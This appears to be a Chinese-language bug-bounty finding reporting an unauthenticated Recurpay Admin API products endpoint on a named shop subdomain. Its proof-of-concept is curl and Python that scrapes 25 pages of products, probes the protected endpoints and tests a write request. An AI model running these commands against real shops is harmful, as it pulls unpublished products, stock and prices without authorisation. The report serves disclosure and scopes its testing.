# Recurpay 店铺子域 Admin API 商品列表未鉴权

## 判据
- 目标：`https://<shop>.recurpay.com/admin/api/<version>/products`
- 无凭据 GET 返回 200 + `{"success":true,"data":{"products":[...]},"page_info":{...}}`
- 对照：同前缀 `/orders`、`/webhooks`、`/subscriptions`、`/plans` 返回 401 `Invalid API key or access token`
- 响应头 `access-control-allow-origin: *`

## PoC
```bash
SHOP=gamers-delight-online
BASE="https://$SHOP.recurpay.com/admin/api/2024-07"
curl -sS "$BASE/products" -o p1.json
curl -sS "$BASE/products?page=2" -o p2.json
# 全量
for i in $(seq 1 25); do curl -sS "$BASE/products?page=$i" -o "p$i.json"; sleep 0.5; done
python3 - <<'EOF'
import json,glob
ps=[]
for f in glob.glob('p*.json'):
    ps+=json.load(open(f))['data']['products']
print('total',len(ps),'draft',sum(1 for p in ps if p.get('status') is False))
EOF
# 对照鉴权面
for r in orders webhooks subscriptions plans; do curl -sS -o /dev/null -w "$r %{http_code}\n" "$BASE/$r"; done
# 写验证
curl -sS -X POST -H 'Content-Type: application/json' -d '{"product":{"title":"x"}}' -o /dev/null -w "POST %{http_code}\n" "$BASE/products"
```

## 注意
- 版本段（2023-01 … latest）被应用忽略，全部返回同一缓存数据；仅 `page`、`status` 参数生效，`limit/ids/q/handle/fields` 被忽略。
- `page` 无 SQLi 迹象（引号/布尔/时间/负数探针均回默认第 1 页，无差异）。
- 只读：POST → 405（allow GET,HEAD），PUT/PATCH/DELETE → 404，`X-HTTP-Method-Override` 无效。
- 不含顾客 PII；泄露为商品目录 + 52 个未发布草稿 + 库存/SKU/价格。
- 不要把测试扩展到其它店铺子域（多租户越界）。